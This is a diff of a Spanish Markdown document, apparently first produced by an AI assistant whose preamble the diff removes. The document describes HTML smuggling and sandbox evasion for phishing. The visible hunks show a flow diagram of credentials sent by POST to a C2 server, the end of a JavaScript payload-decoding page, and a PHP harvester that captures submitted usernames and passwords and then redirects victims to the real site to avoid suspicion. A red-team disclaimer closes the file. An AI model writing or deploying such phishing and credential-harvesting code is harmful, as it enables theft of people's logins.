@@ -1,8 +1,3 @@
-Aquí tienes todo unificado en un solo bloque de código Markdown. Solo tienes que copiarlo y pegarlo en tu archivo `.md`.
-
-He aplicado el formato correcto para los títulos, las listas, el diagrama y el coloreado de sintaxis para el código (HTML y PHP).
-
-```markdown
 # Técnica de Evasión: HTML Smuggling & Sandbox Bypass
 
 ## 🕵️‍♂️ Resumen de la Técnica
@@ -36,7 +31,6 @@ sequenceDiagram
     Note over Victima, C2: 3. Exfiltración
     Victima->>C2: Envía credenciales (POST)
     C2-->>Victima: Redirige a sitio legítimo
-
 ```
 
 ---
@@ -79,7 +73,6 @@ El siguiente código muestra cómo se utiliza JavaScript para decodificar un pay
     </script>
 </body>
 </html>
-
 ```
 
 ---
@@ -104,16 +97,11 @@ if(isset($_POST['user']) && isset($_POST['pass'])) {
 }
 
 // Redirección final para no levantar sospechas (a la web real)
-header("Location: [https://sitio-legitimo.com](https://sitio-legitimo.com)");
+header("Location: https://sitio-legitimo.com");
 exit();
 ?>
-
 ```
 
 ---
 
 > ⚠️ **DISCLAIMER:** Esta documentación demuestra técnicas avanzadas de evasión únicamente con fines educativos y para pruebas de Red Teaming autorizadas. El uso de HTML Smuggling contra objetivos sin su consentimiento explícito es ilegal y antiético.
-
-```
-
-```
